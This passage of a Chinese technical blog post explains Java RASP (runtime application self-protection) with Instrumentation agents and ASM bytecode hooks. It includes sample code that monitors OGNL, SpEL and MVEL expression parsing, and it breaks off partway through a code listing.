    <content type="html"><![CDATA[<p>本篇将近一个月对rasp的研究成果进行汇总，具体讨论RASP的优劣势以及一些个人的理解和看法。</p><a id="more"></a><h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>RASP是<code>Runtime application self-protection</code>的缩写，中文翻译为应用程序运行时防护，其与WAF等传统安全防护措施的主要区别于其防护层级更加底层——在功能调用前或调用时能获取访问到当前方法的参数等信息，根据这些信息来判定是否安全。</p><p>RASP与传统的基于流量监测的安全防护产品来说，优势点在于<strong>可以忽略各种绕过流量检测的攻击方式（如分段传输，编码等），只关注功能运行时的传参是否会产生安全威胁。简单来说，RASP不看过程，只看具体参数导致方法实现时是否会产生安全威胁。</strong>简单类比一下，RASP就相当于应用程序的主防，其判断是更加精准的。</p><p>虽然RASP有很多优势，但是由于其本身的实现也导致了很多问题使其难以推广：</p><ul><li>侵入性过大。对于JAVA的RASP来说，它的实现方式是通过<code>Instrumentation</code>编写一个agent，在agent中加入hook点，当程序运行流程到了hook点时，将检测流程插入到字节码文件中，统一进入JVM中执行。在这里如果RASP本身出现了什么问题的话，将会直接对业务造成影响。</li><li>效率问题。由于需要将检测流程插入到字节码文件中，这样会在运行时产生大量不属于业务流程本身的逻辑，这样会增加业务执行的流程，对业务效率造成一定的影响。</li><li>开发问题。针对不同的语言，RASP底层的实现是不一样的，都需要重新基于语言特性进行专门的开发，开发的压力很大。</li><li>部署问题。以Java RASP来举例子，Java RASP有两种部署方式，一种需要在启动前指定agent的位置，另一种可以在运行时用attach的方式进行部署，但是他们都存在不同的问题。<ul><li>在启动前指定agent的位置就以为着在进行部署时需要重启服务，会影响到正常的业务。</li><li>在运行时进行attach部署时，当后期RASP进行版本迭代重新attach时，会产生重复添加代码的情况（由于JVM本身机制的问题，基本无法将修改的字节码重新转换到运行时的字节码上，所以没办法动态添加代理解决该问题）。</li></ul></li></ul><p>目前RASP的主方向还是Java RASP，受益于JVMTI，现在的Java RASP是很好编写的，效果也是比较错的。同时也受限于JVMTI，Java RASP的技术栈受到了一定的限制，很难在具体实现上更进一步，只能在hook点和其他功能上进行完善。</p><p>跳出乙方视角来审视RASP，其最好的实践场景还是在<strong>甲方企业内部</strong>，从某个角度来说RASP本来就是高度侵入业务方代码的一种防护措施，在纷繁复杂的业务场景中，只有甲方根据业务进行定制化开发才能达到RASP的最高价值，如果乙方来做很容易变成“纸上谈兵”的产品。</p><p>下面将以Java RASP为核心对RASP技术进行详细的阐述，并用跟踪源码的方式来解析百度OpenRASP的具体实现方式。</p><h1 id="0x02-Java-RASP技术栈"><a href="#0x02-Java-RASP技术栈" class="headerlink" title="0x02 Java RASP技术栈"></a>0x02 Java RASP技术栈</h1><p>Java RASP核心技术栈：</p><ul><li><code>Instrumentation</code>通过JVMTI实现的Agent，负责获取并返回当前JVM虚拟机的状态或转发控制命令。</li><li>字节码操作框架，用于修改字节码（如ASM、Javassist等）</li></ul><p>其余技术栈：</p><ul><li>Log4j日志记录</li><li>插件系统（主要是用于加载检测规则）</li><li>数据存储及转发（转发到soc平台或自动封禁平台进行封禁）<br>等</li></ul><h1 id="0x03-Java-RASP实现方式"><a href="#0x03-Java-RASP实现方式" class="headerlink" title="0x03 Java RASP实现方式"></a>0x03 Java RASP实现方式</h1><p>编写Java RASP主要分为两部分：</p><ul><li><code>Java Agent</code>的编写</li><li>利用字节码操作框架（以下都以ASM来举例）完成相应hook操作</li></ul><h2 id="3-1-Java-Agent简介"><a href="#3-1-Java-Agent简介" class="headerlink" title="3.1 Java Agent简介"></a>3.1 Java Agent简介</h2><p>在Java SE 5及后续版本中，开发者可以在一个普通Java程序运行时，通过<code>-javaagent</code>参数指定一个特定的<code>jar</code>文件（该文件包含<code>Instrumentation</code>代理）来启动<code>Instrumentation</code>的代理程序，这个代理程序可以使开发者获取并访问JVM运行时的字节码，并提供了对字节码进行编辑的操作，这就意味着开发者可以将自己的代码注入，在运行时完成相应的操作。在Java SE 6后又对改功能进行了增强，允许开发者以用Java Tool API中的attach的方式在程序运行中动态的设置代理类，以达到<code>Instrumentation</code>的目的。而这两个特性也是编写Java RASP的关键。</p><p><code>javaagent</code>提供了两种模式：</p><ul><li><code>premain</code>：允许在main开始前修改字节码，也就是在<strong>大部分类加载前</strong>对字节码进行修改。</li><li><code>agentmain</code>：允许在main执行后通过<code>com.sun.tools.attach</code>的Attach API attach到程序运行时中，通过<code>retransform</code>的方式修改字节码，也就是在<strong>类加载后通过类重新转换（定义）的方式在方法体中</strong>对字节码进行修改，<strong>其本质还是在类加载前对字节码进行修改</strong>。</li></ul><p>这两种模式除了在<code>main</code>开始前后调用的区别外，还有很多细枝末节的区别，这一点就导致了两种模式的泛用性不同：</p><ul><li>agent运作模式不同：<code>premain</code>相当于在main前类加载时进行字节码修改，<code>agentmain</code>是main后在类调用前通过重新转换类完成字节码修改。可以发现他们的本质都是在类加载前完成的字节码修改，但是<code>premain</code>可以直接修改或者通过<code>redefined</code>进行类重定义，而<code>agentmian</code>必须通过<code>retransform</code>进行类重新转换才能完成字节码修改操作。</li><li>部署方式不同：由于agent运作模式的不同，所以才导致<code>premain</code>需要在程序启动前指定agent，而<code>agentmain</code>需要通过Attach API进行attach。而且由于都是在类加载前进行字节码的修改，所以<strong>如果<code>premain</code>模式的hook进行了更新，就只能重启服务器，而<code>agentmain</code>模式的hook如果进行了更新的话，需要重新attach</strong>。</li></ul><p>因为两种模式都存在一定的限制，所以在实际运用中都会有相应的问题：</p><ul><li><code>premain</code>：每次修改需要重启服务。</li><li><p><code>agentmain</code>：由于attach的运行时中的进程，因JVM的进程保护机制，禁止在程序运行时对运行时的类进行自由的修改，具体的限制如下：</p><ul><li>父类应为同一个类</li><li>实现的接口数要相同</li><li>类访问符要一致</li><li>字段数和字段名必须一致</li><li>新增的方法必须是<code>private static/final</code>的</li><li><p>可是删除修改方法</p><p>这样的限制是没有办法用代理模式的思路来避免重复插入的。同时为了实现增加hook点的操作我们必须将自己的检测字节码插入，所以只能修改方法体。这样一来如果使用<code>agentmain</code>进行重复的attach，会造成将相同代码多次插入的操作，会产生重复告警，极大的增加业务压力。</p></li></ul></li></ul><p>单单针对<code>agentmain</code>所出现的重复插入的问题，有没有方式能直接对运行时的java类做字节码插入呢？其实是有的，但是由于各种原因，其会较大的增加业务压力所以这里不过多叙述，想要了解详情的读者，可以通过搜索<code>Hotswap</code>和<code>DCE VM</code>来了解两种不同的热部署方式。</p><h2 id="3-2-ASM简介"><a href="#3-2-ASM简介" class="headerlink" title="3.2 ASM简介"></a>3.2 ASM简介</h2><p>ASM是一个Java字节码操作框架，它主要是基于访问者模式对字节码完成相应的增删改操作。想要深入的理解ASM可以去仔细阅读<a href="https://asm.ow2.io/asm4-guide.pdf" target="_blank" rel="noopener">ASM的官方文档</a>，这里只是简单的介绍一下ASM的用法。</p><p>在开始讲ASM用法前，需要简单的介绍一下访问者模式，只有清楚的访问者模式，才能理解ASM为什么要这么写。</p><h4 id="3-2-1-访问者模式"><a href="#3-2-1-访问者模式" class="headerlink" title="3.2.1 访问者模式"></a>3.2.1 访问者模式</h4><p>在面向对象编程和软件工程中，访问者模式是一种把数据结构和操作这个数据结构的算法分开的模式。这种分离能方便的添加新的操作而无需更改数据结构。</p><p>实质上，访问者允许一个类族添加新的虚函数而不修改类本身。但是，创建一个访问者类可以实现虚函数所有的特性。访问者接收实例引用作为输入，使用双重调用实现这个目标。</p><p>上面说的的比较笼统，直接用代码来说话：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lucifaer.ASMDemo;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Visitor v)</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Play</span> <span class="keyword">implements</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Visitor v)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        v.visit(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">play</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">        System.out.println(<span class="string">"This is Person's Play!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Visitor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(Play p)</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonVisitor</span> <span class="keyword">implements</span> <span class="title">Visitor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(Play p)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"In Visitor!"</span>);</span><br><span class="line">        <span class="keyword">long</span> start_time = System.currentTimeMillis();</span><br><span class="line">        p.play();</span><br><span class="line">        <span class="keyword">long</span> end_time = System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">"End Visitor"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Spend time: "</span> + (end_time-start_time));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VisiterMod</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Person p = <span class="keyword">new</span> Play();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        PersonVisitor pv = <span class="keyword">new</span> PersonVisitor();</span><br><span class="line">        p.accept(pv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中做了以下的工作:</p><ol><li>添加<code>void accept(Visitor v)</code>到<code>Person</code>类中</li><li>创建visitor基类，基类中包含元素类的<code>visit()</code>方法</li><li>创建visitor派生类，实现基类对<code>Person</code>的<code>Play</code>的操作</li><li>使用者创建visitor对象，调用元素的accept方法并传递visitor实例作为参数</li></ol><p>可以看到在没有改变数据结构的情况下只是实现了Visitor类就可以在visit方法中自行加入代码实现自定义逻辑，而不会影响到原本Person接口的实现类。</p><p>结果为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15689648468141.jpg" alt=""></p><h4 id="3-2-2-ASM的访问者模式"><a href="#3-2-2-ASM的访问者模式" class="headerlink" title="3.2.2 ASM的访问者模式"></a>3.2.2 ASM的访问者模式</h4><p>在ASM中的访问者模式中，<code>ClassReader</code>类和<code>MethodNode</code>类都是被访问的类，访问者接口包括：<code>ClassVistor</code>、<code>AnnotationVisitor</code>、<code>FieldVistor</code>和<code>MethodVistor</code>。访问者接口的方法集以及优先顺序可以在下图中进行查询：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15689714569539.jpg" alt=""></p><p>通过该图可以清晰的看出调用顺序，对于新手来说可以简单的理解为下面这样的调用顺序：</p><ul><li>需要访问类，所以要声明<code>ClassReader</code>，来“获取”类。</li><li>如果需要对类中的内容进行修改，就需要声明<code>ClassWriter</code>它是继承于<code>ClassReader</code>的。</li><li><p>然后实例化“访问者”<code>ClassVisitor</code>来进行类访问，至此就以“访问者”的身份进入了类，你可以进行以下工作：</p><ul><li>如果需要访问注解，则实例化<code>AnnotationVisitor</code></li><li>如果需要访问参数，则实例化<code>FieldVisitor</code></li><li><p>如果需要访问方法，则实例化<code>MethodVisitro</code></p><p>每种访问其内部的访问顺序可以在图上自行了解。</p></li></ul></li><li><code>ClassReader</code>调用<code>accept</code>方法</li><li>完成整个调用流程</li></ul><h2 id="3-3-实际例子"><a href="#3-3-实际例子" class="headerlink" title="3.3 实际例子"></a>3.3 实际例子</h2><p>在具体展示两种模式的例子前，先补充一下agent的运行条件，无论用那种模式写出来的agent，都需要将agent打成jar包，同时在jar包中应用<code>META-INF/MANIFEST.MF</code>中指定agent的相关信息，下面是个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: com.lucifaer.javaagentLearning.agent.PreMainTranceAgent</span><br><span class="line">Agent-Class: com.lucifaer.javaagentLearning.agent.AgentMainTranceAgent</span><br></pre></td></tr></table></figure><p><code>Premain-Class</code>和<code>Agent-Class</code>是用来配置不同模式的agent实现类，<code>Can-Redefine-Classes</code>和<code>Can-Retransform-Classes</code>是用来指示是否允许进行类重定义和类重新转换，这两个参数在一定的情况下决定了是否能在agent中利用ASM对加载的类进行修改。</p><h3 id="3-3-1-premain模式例子"><a href="#3-3-1-premain模式例子" class="headerlink" title="3.3.1 premain模式例子"></a>3.3.1 premain模式例子</h3><p>下面用园长的一个demo来展示如何利用<code>premain</code>方式进行表达式监控。完整代码可以看<a href="https://github.com/anbai-inc/javaweb-expression" target="_blank" rel="noopener">这里</a>，也可以看我<a href="https://github.com/Lucifaer/head_first_javarasp/tree/el_expression_hook" target="_blank" rel="noopener">整理后的代码</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Agent</span> <span class="keyword">implements</span> <span class="title">Opcodes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> List&lt;MethodHookDesc&gt; expClassList = <span class="keyword">new</span> ArrayList&lt;MethodHookDesc&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        expClassList.add(<span class="keyword">new</span> MethodHookDesc(<span class="string">"org.mvel2.MVELInterpretedRuntime"</span>, <span class="string">"parse"</span>,</span><br><span class="line">                <span class="string">"()Ljava/lang/Object;"</span>));</span><br><span class="line">        expClassList.add(<span class="keyword">new</span> MethodHookDesc(<span class="string">"ognl.Ognl"</span>, <span class="string">"parseExpression"</span>,</span><br><span class="line">                <span class="string">"(Ljava/lang/String;)Ljava/lang/Object;"</span>));</span><br><span class="line">        expClassList.add(<span class="keyword">new</span> MethodHookDesc(<span class="string">"org.springframework.expression.spel.standard.SpelExpression"</span>, <span class="string">"&lt;init&gt;"</span>,</span><br><span class="line">                <span class="string">"(Ljava/lang/String;Lorg/springframework/expression/spel/ast/SpelNodeImpl;"</span> +</span><br><span class="line">                        <span class="string">"Lorg/springframework/expression/spel/SpelParserConfiguration;)V"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"agentArgs : "</span> + agentArgs);</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> ClassFileTransformer() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">                <span class="keyword">final</span> String class_name = className.replace(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">final</span> MethodHookDesc methodHookDesc : expClassList) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (methodHookDesc.getHookClassName().equals(class_name)) &#123;</span><br><span class="line">                        <span class="keyword">final</span> ClassReader classReader = <span class="keyword">new</span> ClassReader(classfileBuffer);</span><br><span class="line">                        ClassWriter classWriter = <span class="keyword">new</span> ClassWriter(classReader, ClassWriter.COMPUTE_MAXS);</span><br><span class="line">                        <span class="keyword">final</span> <span class="keyword">int</span> api = ASM5;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ClassVisitor classVisitor = <span class="keyword">new</span> ClassVisitor(api, classWriter) &#123;</span><br><span class="line">                                <span class="meta">@Override</span></span><br><span class="line">                                <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> i, String s, String s1, String s2, String[] strings)</span> </span>&#123;</span><br><span class="line">                                    <span class="keyword">final</span> MethodVisitor methodVisitor = <span class="keyword">super</span>.visitMethod(i, s, s1, s2, strings);</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">if</span> (methodHookDesc.getHookMethodName().equals(s) &amp;&amp; methodHookDesc.getHookMethodArgTypeDesc().equals(s1)) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> <span class="keyword">new</span> MethodVisitor(api, methodVisitor) &#123;</span><br><span class="line">                                            <span class="meta">@Override</span></span><br><span class="line">                                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                                                <span class="keyword">if</span> (<span class="string">"ognl.Ognl"</span>.equals(class_name)) &#123;</span><br><span class="line">                                                    methodVisitor.visitVarInsn(Opcodes.ALOAD, <span class="number">0</span>);</span><br><span class="line">                                                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                                                    methodVisitor.visitVarInsn(Opcodes.ALOAD, <span class="number">1</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                                                methodVisitor.visitMethodInsn(</span><br><span class="line">                                                        Opcodes.INVOKESTATIC, Agent.class.getName().replace(<span class="string">"."</span>, <span class="string">"/"</span>), <span class="string">"expression"</span>, <span class="string">"(Ljava/lang/String;)V"</span>, <span class="keyword">false</span></span><br><span class="line">                                                );</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        &#125;;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">return</span> methodVisitor;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;;</span><br><span class="line">                            classReader.accept(classVisitor, ClassReader.EXPAND_FRAMES);</span><br><span class="line">                            classfileBuffer = classWriter.toByteArray();</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                            t.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">expression</span><span class="params">(String exp_demo)</span> </span>&#123;</span><br><span class="line">        System.err.println(<span class="string">"---------------------------------EXP-----------------------------------------"</span>);</span><br><span class="line">        System.err.println(exp_demo);</span><br><span class="line">        System.err.println(<span class="string">"---------------------------------调用链---------------------------------------"</span>);</span><br><span class="line"></span><br><span class="line">        StackTraceElement[] elements = Thread.currentThread().getStackTrace();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (StackTraceElement element : elements) &#123;</span><br><span class="line">            System.err.println(element);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.err.println(<span class="string">"-----------------------------------------------------------------------------"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里采用的是流式写法，没有将其中的<code>ClassFileTransformer</code>抽出来。</p><p>整个流程简化如下：</p><ul><li>根据<code>className</code>来判断当前agent拦截的类是否是需要hook的类，如果是，则直接进入ASM修改流程。</li><li>在<code>ClassVisitor</code>中调用<code>visitMethod</code>方法去访问hook类中的每个方法，根据方法名判断当前的方法是否是需要hook的方法，如果是，则调用<code>visitCode</code>方法在访问具体代码时获取方法的相关参数（这里是获取表达式），并在执行逻辑中插入<code>expression</code>方法的调用，在运行时将执行流经过新添加的方法，就可以打印出表达式以及调用链了。</li></ul><p>效果如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/09/25/15682851340114.jpg" alt=""></p><h3 id="3-3-2-agentmain模式例子"><a href="#3-3-2-agentmain模式例子" class="headerlink" title="3.3.2 agentmain模式例子"></a>3.3.2 agentmain模式例子</h3><p>下面用一个我自己写的例子来说一下如何利用agentmain模式增加执行流。</p><blockquote><p>AgentMain.java</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMain</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> UnmodifiableClassException </span>&#123;</span><br><span class="line"><span class="comment">//        for (Class clazz : inst.getAllLoadedClasses()) &#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(clazz.getName());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        CustomClassTransformer transformer = <span class="keyword">new</span> CustomClassTransformer(inst);</span><br><span class="line">        transformer.retransform();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>CustomClassTransformer.java</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomClassTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Instrumentation inst;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CustomClassTransformer</span><span class="params">(Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.inst = inst;</span><br><span class="line">        inst.addTransformer(<span class="keyword">this</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        System.out.println(<span class="string">"In Transform"</span>);</span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(classfileBuffer);</span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(cr, ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        ClassVisitor cv = <span class="keyword">new</span> ClassVisitor(Opcodes.ASM5, cw) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> i, String s, String s1, String s2, String[] strings)</span> </span>&#123;</span><br><span class="line"><span class="comment">//                return super.visitMethod(i, s, s1, s2, strings);</span></span><br><span class="line">                <span class="keyword">final</span> MethodVisitor mv = <span class="keyword">super</span>.visitMethod(i, s, s1, s2, strings);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">"say"</span>.equals(s)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> MethodVisitor(Opcodes.ASM5, mv) &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                            <span class="keyword">super</span>.visitCode();</span><br><span class="line">                            mv.visitFieldInsn(Opcodes.GETSTATIC, <span class="string">"java/lang/System"</span>, <span class="string">"out"</span>, <span class="string">"Ljava/io/PrintStream;"</span>);</span><br><span class="line">                            mv.visitLdcInsn(<span class="string">"CALL "</span> + <span class="string">"method"</span>);</span><br><span class="line">                            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, <span class="string">"java/io/PrintStream"</span>, <span class="string">"println"</span>, <span class="string">"(Ljava/lang/String;)V"</span>, <span class="keyword">false</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> mv;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        cr.accept(cv, ClassReader.EXPAND_FRAMES);</span><br><span class="line">        classfileBuffer = cw.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">retransform</span><span class="params">()</span> <span class="keyword">throws</span> UnmodifiableClassException </span>&#123;</span><br><span class="line">        LinkedList&lt;Class&gt; retransformClasses = <span class="keyword">new</span> LinkedList&lt;Class&gt;();</span><br><span class="line">        